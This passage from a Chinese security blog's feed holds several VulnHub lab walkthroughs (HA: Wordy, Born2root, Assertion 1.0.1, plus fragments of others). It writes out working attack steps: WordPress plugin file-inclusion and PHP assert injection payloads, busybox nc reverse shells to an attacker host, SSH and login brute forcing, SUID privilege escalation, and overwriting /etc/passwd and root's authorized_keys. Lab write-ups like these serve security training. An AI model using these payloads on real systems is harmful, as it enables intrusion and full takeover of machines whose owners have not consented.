hummingbirdscyber@172.16.33.66</span><br></pre></td></tr></table></figure><p>登陆成功</p><p><img src="/picture/image-20250325165657237.png" alt="image-20250325165657237"></p><p>运行 id 命令，发现我们远程登陆的用户属于 docker 组，可以无需 <code>sudo</code> 直接操作 Docker</p><p><img src="/picture/image-20250325170409408.png" alt="image-20250325170409408"></p><p>由于需要知道使用的镜像名称执行如下命令查看，为 Ubuntu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250325171437712.png" alt="image-20250325171437712"></p><p>启动一个新的 Docker 容器，将宿主机的根目录 <code>/</code> 挂载到容器内的 <code>/root</code> 目录</p><p>保持标准输入（STDIN）打开，允许交互操作，同时分配一个伪终端（TTY）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -v /:/root -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/picture/image-20250325170703308.png" alt="image-20250325170703308"></p><p>获得 flag</p><p><img src="/picture/image-20250325170826685.png" alt="image-20250325170826685"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HAWordy Walkthrough</title>
      <link href="/2025/03/24/HAWordy/"/>
      <url>/2025/03/24/HAWordy/</url>
      
        <content type="html"><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p><p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure><p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure><p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p><p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p><p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p><p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p><p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p><p>用户名确定，可以试试密码爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure><p>发送的参数可以在开发者工具中的 NetWork 中找到</p><p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p><p>可惜，rockyou 没跑出来，说明密码十分复杂</p><p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p><p>既然是 wp 构建的，使用 wpscan 扫扫看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure><p>发现了一些目录：</p><p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p><p>访问 readme ，只是一个下载引导页面</p><p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p><p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p><p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p><p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p><p>再来看插件，分别是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure><p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p><p>看看能不能包含 apache 服务日志：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure><p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p><p>尝试反弹 shell </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure><p>同时开启 nc 监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p><p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p><p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p><p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p><p>本机编写接收程序，将 zip 文件上传到宿主机上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>启动接受服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure><p>在目标主机上执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure><p>接收成功，解压时发现需要密码</p><p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p><p>将密码哈希保存为字典，使用 john 破译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure><p>又没跑出密码，看来得在目标主机里找了（</p><p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p><p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>看到了一个有趣的东西：</p><p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p><p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure><p>利用成功</p><p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p><p>接下来就是进入 root 目录获得最终 flag</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p><p>或者可以使用 cp 命令</p><p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure><p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p><p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p> 看来 secret.zip 是兔子洞，误导你的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Born2root Walkthrough</title>
      <link href="/2025/03/23/Born2root/"/>
      <url>/2025/03/23/Born2root/</url>
      
        <content type="html"><![CDATA[<h1 id="Born2root-Walkthrough"><a href="#Born2root-Walkthrough" class="headerlink" title="Born2root Walkthrough"></a>Born2root Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[Born2Root: 1](<a href="https://www.vulnhub.com/entry/born2root-1,197/">Born2Root: 1 ~ VulnHub</a>)</p><p><img src="/picture/image-20250323173030438.png" alt="image-20250323173030438"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.98  </span><br></pre></td></tr></table></figure><p>发现 22，80，111，38734 端口</p><p><img src="/picture/image-20250323103653485.png" alt="image-20250323103653485"></p><p>在进行应用版本发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80,111,38734 -A -T4 172.16.33.98</span><br></pre></td></tr></table></figure><p>也是发现了 80 端口的 robots.txt ，同时发现高位端口的服务还是不明</p><p><img src="/picture/image-20250323103810069.png" alt="image-20250323103810069"></p><p>先来看看 22 端口，直接使用 ssh 客户端连接，尝试弱口令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.98  </span><br></pre></td></tr></table></figure><p>可惜的是连接上了 ssh ，并未泄露什么信息，同时弱口令也行不通</p><p><img src="/picture/image-20250323104428522.png" alt="image-20250323104428522"></p><p>再来看看 80 端口，先前 nmap 扫到了 robots.txt ，直接访问是两个网站 </p><p>&#x2F;wordpress-blog 纯是干扰信息，逗你玩的</p><p><img src="/picture/image-20250323104615308.png" alt="image-20250323104615308"></p><p>&#x2F;files 也是空的</p><p><img src="/picture/image-20250323104659011.png" alt="image-20250323104659011"></p><p>那么扫描目录看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.98/</span><br></pre></td></tr></table></figure><p>换了好些字典，也只扫出来了 &#x2F;files ，&#x2F;icons，&#x2F;manual 和 robots.txt </p><p>在 &#x2F;icons 下发现了 VDSoyuAXiO.txt 可疑文件，访问发现是 RSA PRIVATE KEY，但是并不知道这个 key 的用户名是谁</p><p><img src="/picture/image-20250323105621435.png" alt="image-20250323105621435"></p><p>而 &#x2F;manual 是 Apache HTTP 服务器 2.4 的文档，没有提供用户名信息，那我们直接访问 ip 试试看</p><p>发现了三个用户名：martin，hadi，jimmy 和邮箱地址 <code>martin@secretsec.com</code>  </p><p><img src="/picture/image-20250323110327281.png" alt="image-20250323110327281"></p><p>将各用户名配合泄露的密钥尝试 ssh 登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i private.key martin@172.16.33.98</span><br><span class="line">ssh -i private.key hadi@172.16.33.98</span><br><span class="line">ssh -i private.key jimmy@172.16.33.98</span><br></pre></td></tr></table></figure><p>可惜都失败了，80 端口似乎没有路子了，再来看看 111 端口，尝试登陆和用户名登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient 172.16.33.98</span><br><span class="line">rpcclient --user jimmy 172.16.33.98</span><br><span class="line">rpcclient --user hadi 172.16.33.98</span><br><span class="line">rpcclient --user martin 172.16.33.98</span><br></pre></td></tr></table></figure><p>都报了 Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED 错，意思是目标主机虽然开启了 111 端口 NFS 服务，但不接受登录请求</p><p><img src="/picture/image-20250323154952588.png" alt="image-20250323154952588"></p><p>既然不让我们登陆，那我们拿他也没什么办法，那只能试试 SSH 密码爆破了，毕竟有三个用户名</p><p>将三个用户名保存为用户名字典 user.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure><blockquote><p>s 参数会将用户名当成密码尝试</p><p>r 会使用倒置的用户名当作密码尝试</p><p>n 使用空密码</p></blockquote><p>密码字典也可以使用 cewl 在目标网站进行爬取后生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl 172.16.33.98 -m 4 -w pass.txt</span><br></pre></td></tr></table></figure><p>开始密码爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P pass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure><p>可惜没跑出来</p><p><img src="/picture/image-20250323160928271.png" alt="image-20250323160928271"></p><p>试试对 pass.txt 进行变形操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat --stdout pass.txt -r /usr/share/hashcat/rules/combinator.rule -o newpass.txt</span><br></pre></td></tr></table></figure><p>再使用新的密码跑一遍看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P newpass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure><p>密码为 hadi123 </p><p><img src="/picture/image-20250323164351354.png" alt="image-20250323164351354"></p><p>直接 ssh 登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh hadi@172.16.33.98</span><br></pre></td></tr></table></figure><p>登陆成功</p><p><img src="/picture/image-20250323162853128.png" alt="image-20250323162853128"></p><p>接下来就是提权，比较搞的时，su 的密码也是 hadi123 ，直接就变成 root 了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250323172852355.png" alt="image-20250323172852355"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Assertion101 Walkthrough</title>
      <link href="/2025/03/22/Assertion101/"/>
      <url>/2025/03/22/Assertion101/</url>
      
        <content type="html"><![CDATA[<h1 id="Assertion-1-0-1-Walkthrough"><a href="#Assertion-1-0-1-Walkthrough" class="headerlink" title="Assertion: 1.0.1 Walkthrough"></a>Assertion: 1.0.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/assertion-101,495/#top">Assertion: 1.0.1</a></p><p><img src="/picture/image-20250324142845574.png" alt="image-20250324142845574"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.99</span><br></pre></td></tr></table></figure><p>发现 22、80 端口</p><p><img src="/picture/image-20250324143056755.png" alt="image-20250324143056755"></p><p>对开放的端口做应用版本发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80 -A -T4 172.16.33.99</span><br></pre></td></tr></table></figure><p>发现 SSH 和 Apache 服务版本较高，漏洞较少且利用复杂，暂不考虑</p><p><img src="/picture/image-20250324143630111.png" alt="image-20250324143630111"></p><p>先来看 22 端口，尝试直接连接以及弱口令能不能泄露机密信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.99 </span><br></pre></td></tr></table></figure><p>很遗憾，失败了，什么也没泄露</p><p><img src="/picture/image-20250324143811794.png" alt="image-20250324143811794"></p><p>试试 SSH 爆破 root 密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.99</span><br></pre></td></tr></table></figure><p>没爆破出来</p><p>好吧，看来 22 端口暂时无从下手了，再来看看 80 端口</p><p>进行下 WEB 目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.99  </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/wordlists/dirb/big.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/big.txt </span><br></pre></td></tr></table></figure><p>说实话，后面几个加了字典的还没不加字典的第一个扫出来的多</p><p><img src="/picture/image-20250324144159467.png" alt="image-20250324144159467"></p><p>访问页面，你会发现他的超链接做的挺乱的，就以 about 那个页面来说，网站上有三种通向该页面的超链接，但也只有前两种有用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=about</span><br><span class="line">http://172.16.33.99/about.php</span><br><span class="line">http://172.16.33.99/about.html</span><br></pre></td></tr></table></figure><p>探寻页面一会后，你会发现，home 、about us、schedule、gallery、blog、contains 这几个页面站内所有链接的 action 都是 # ，说明是无用链接</p><p><img src="/picture/image-20250324144732104.png" alt="image-20250324144732104"></p><p>再来看看 &#x2F;pages 目录，发现刚好与网页各个展示内容对应</p><p><img src="/picture/image-20250324145849180.png" alt="image-20250324145849180"></p><p>结合 <code>http://172.16.33.99/index.php?page=about</code> ，可以大胆猜测一下，是否存在文件包含？</p><p>尝试包含 &#x2F;etc&#x2F;passwd 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>噢？看来是对关键词做了过滤</p><p><img src="/picture/image-20250324150045976.png" alt="image-20250324150045976"></p><p>生成长度为一的关键词字典</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -f /usr/share/crunch/charset.lst symbols-all &gt; s.txt </span><br></pre></td></tr></table></figure><p>测试一下有哪些关键词被过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w s.txt:VAL -u http://172.16.33.99/index.php?page=VAL -fr &quot;File does not exist&quot;</span><br></pre></td></tr></table></figure><p>嗯？还有意外之喜，单引号既然会引起服务端错误，要么是 SQL 注入，要么是命令注入</p><p>这里显然不是 SQL 注入，因为响应的页面为空，执行 <code>&#39; or 1=1 #</code> 的响应也为空</p><p><img src="/picture/image-20250324151407818.png" alt="image-20250324151407818"></p><p>那么就是关于 PHP 内容的命令注入，我们可以将核心代码看成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$page</span>&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure><p>输入的单引号会破坏原语句的结构，导致响应 500</p><p>尝试插入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;id&quot;)) or &#x27;</span><br></pre></td></tr></table></figure><p>语句就变成了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;&#x27;and die(system(&quot;</span>id<span class="string">&quot;)) or &#x27;&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure><p>就可以执行命令</p><p><img src="/picture/image-20250324152258829.png" alt="image-20250324152258829"></p><p>能执行命令就简单了，直接使用 busybox 反弹 shell </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;busybox nc 10.8.0.90 1234 -e /bin/bash&quot;)) or &#x27;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/picture/image-20250324152503892.png" alt="image-20250324152503892"></p><p>接下来是提权，查看 sudo 版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure><p>1.8.21 处在 1.8.2 ~ 1.8.31p2 直接，可以使用 CVE-2021-3156 提权</p><p><img src="/picture/image-20250324152621815.png" alt="image-20250324152621815"></p><p>切换到 &#x2F;tmp 目录，将 exp 上传至目标主机，赋予可执行权限后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/picture/image-20250324152956639.png" alt="image-20250324152956639"></p><p>切换至 cd 目录，获得 flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root </span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250324153219933.png" alt="image-20250324153219933"></p><p>当然，也可以通过 aria2c 的 SUID 权限提权，该文件与 wget 相似，可以远程下载文件</p><p><img src="/picture/image-20250324153523310.png" alt="image-20250324153523310"></p><p>那么就将目标主机上的 &#x2F;etc&#x2F;passwd 文件拷贝到宿主机，将 root 密码更改为已知，再通过 aria2c 远程下载并覆盖原 &#x2F;etc&#x2F;passwd</p><p>由于具有 SUID 的文件运行时会获得 root 权限，所以可以允许修改 &#x2F;etc&#x2F;passwd </p><p>生成已知的密码哈希（123）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure><p>更改后的 passwd</p><p><img src="/picture/image-20250324154812796.png" alt="image-20250324154812796"></p><p>执行下载命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -o &quot;/etc/passwd&quot; &quot;http://10.8.0.90/passwd&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure><p>直接使用 su 提权</p><p><img src="/picture/image-20250324160332053.png" alt="image-20250324160332053"></p><p>也可以制作 SSH 公钥直接写入 root 账号根目录下，然后我在用我的私钥直接和目标主机服务端 SSH 建立连接</p><p>生成 ssh 公私钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250324161554295.png" alt="image-20250324161554295"></p><blockquote><p>直接一路回车就行，生成的公私钥在 .ssh 目录</p></blockquote><p><img src="/picture/image-20250324160802504.png" alt="image-20250324160802504"></p><p>将公钥上传至 root 账号根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -d /root/.ssh/ -o authorized_keys &quot;http://10.8.0.90/id_rsa.pub&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250324161339594.png" alt="image-20250324161339594"></p><p>再宿主机 .ssh 目录使用 SSH 远程登陆</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh root@172.16.33.99   </span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/picture/image-20250324161449534.png" alt="image-20250324161449534"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My CMSMS Walkthrough</title>
      <link href="/2025/03/19/MyCMSMS/"/>
      <url>/2025/03/19/MyCMSMS/</url>
      
